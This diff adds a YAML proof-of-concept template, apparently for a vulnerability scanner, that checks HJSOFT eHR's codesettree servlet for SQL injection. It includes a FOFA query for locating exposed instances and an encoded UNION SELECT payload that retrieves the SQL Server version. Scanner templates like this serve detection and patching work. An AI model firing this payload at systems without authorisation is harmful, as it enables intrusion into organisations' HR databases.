@@ -1,0 +1,20 @@
+id: poc-yaml-hjsoft-ehr-codesettree-sqli
+info:
+  name: 宏景eHR codesettree SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: GET
+  path: /servlet/codesettree?categories=&codesetid=1&flag=c&parentid=-1&status=1
+  expression: "status_code == 200 && \ncontains(body,\"<?xml version\") &&\ncontains(body,\"\
+    <TreeNode\") &&\n!contains(body,\"Microsoft SQL Server\")\n"
+- method: GET
+  path: /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjingSqli~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1
+  expression: "status_code == 200 && \ncontains(body,\"<?xml version\") &&\ncontains(body,\"\
+    <TreeNode\") &&\ncontains(body,\"hongjingSqli\") &&\ncontains(body,\"Microsoft\
+    \ SQL Server\")\n"
+variables: {}
+transport: http
